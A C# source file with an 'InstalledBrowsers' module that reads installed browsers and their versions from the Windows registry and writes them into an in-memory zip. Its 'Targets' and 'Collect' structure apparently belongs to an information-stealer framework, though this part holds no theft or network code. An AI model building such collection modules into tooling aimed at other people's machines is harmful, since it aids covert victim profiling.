using Helper.Data;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;

namespace Targets.Device
{
	public class InstalledBrowsers : ITarget
	{
		public void Collect(InMemoryZip zip, Counter counter)
		{
			var browsers = GetBrowsers()
				.GroupBy(b => b.Name, StringComparer.OrdinalIgnoreCase)
				.Select(g => g.First())
				.ToList();

			if (browsers.Count == 0)
				return;

			int maxName = Math.Max("Name".Length, browsers.Max(b => b.Name?.Length ?? 0));
			int maxVersion = Math.Max("Version".Length, browsers.Max(b => b.Version?.Length ?? 0));
			int inUseLength = "In Use".Length;

			List<string> output = new List<string>
			{
				$"{"Name".PadRight(maxName)} | {"Version".PadRight(maxVersion)}",
				new string('-', maxName + maxVersion + inUseLength + 6)
			};

			output.AddRange(browsers.Select(b =>
			{
				SafeGetExeName(b.Path);
				return $"{b.Name.PadRight(maxName)} | {b.Version.PadRight(maxVersion)}";
			}));

			zip.AddTextFile("InstalledBrowsers.txt", string.Join("\n", output));
		}

		private static IEnumerable<Browser> GetBrowsers()
		{
			string[] registryPaths = new string[]
			{
				"SOFTWARE\\WOW6432Node\\Clients\\StartMenuInternet",
				"SOFTWARE\\Clients\\StartMenuInternet"
			};

			List<Browser> browsers = new List<Browser>();

			foreach (string keyPath in registryPaths)
			{
				browsers.AddRange(GetBrowsersFromRegistry(keyPath, Registry.LocalMachine));
				browsers.AddRange(GetBrowsersFromRegistry(keyPath, Registry.CurrentUser));
			}

			Browser edgeLegacy = GetEdgeLegacyVersion();
			if (edgeLegacy != null)
				browsers.Add(edgeLegacy);

			return browsers;
		}

		private static IEnumerable<Browser> GetBrowsersFromRegistry(string keyPath, RegistryKey root)
		{
			List<Browser> browsers = new List<Browser>();

			using (RegistryKey key = root.OpenSubKey(keyPath))
			{
				if (key == null)
					return browsers;

				foreach (string subKeyName in key.GetSubKeyNames())
				{
					using (RegistryKey subkey = key.OpenSubKey(subKeyName))
					{
						if (subkey?.GetValue(null) is string browserName)
						{
							string commandPath = null;
							using (RegistryKey shellKey = subkey.OpenSubKey("shell\\open\\command"))
							{
								commandPath = shellKey?.GetValue(null)?.ToString();
							}

							string exePath = StripQuotesFromCommand(commandPath);
							string version = "unknown";

							if (!string.IsNullOrEmpty(exePath) && File.Exists(exePath))
							{
								try
								{
									version = FileVersionInfo.GetVersionInfo(exePath).FileVersion ?? "unknown";
								}
								catch { }
							}

							browsers.Add(new Browser
							{
								Name = browserName,
								Path = exePath,
								Version = version
							});
						}
					}
				}
			}

			return browsers;
		}

		private static Browser GetEdgeLegacyVersion()
		{
			using (RegistryKey key = Registry.CurrentUser.OpenSubKey(
				"SOFTWARE\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\CurrentVersion\\AppModel\\SystemAppData\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\Schemas"))
			{
				if (key?.GetValue("PackageFullName") is string packageName)
				{
					Match match = Regex.Match(packageName, @"\d+(\.\d+)+");
					if (match.Success)
					{
						return new Browser
						{
							Name = "Microsoft Edge (Legacy)",
							Path = null,
							Version = match.Value
						};
					}
				}
			}
			return null;
		}

		private static string StripQuotesFromCommand(string command)
		{
			if (string.IsNullOrWhiteSpace(command))
				return null;

			command = command.Trim();

			if (command.StartsWith("\""))
			{
				int endQuote = command.IndexOf('"', 1);
				return endQuote > 1 ? command.Substring(1, endQuote - 1) : null;
			}

			int spaceIndex = command.IndexOf(' ');
			return spaceIndex > 0 ? command.Substring(0, spaceIndex) : command;
		}

		private static string SafeGetExeName(string path)
		{
			try
			{
				return string.IsNullOrWhiteSpace(path) ? null : Path.GetFileName(path)?.ToUpperInvariant();
			}
			catch
			{
				return null;
			}
		}

		private class Browser
		{
			public string Name { get; set; }
			public string Path { get; set; }
			public string Version { get; set; }
		}
	}
}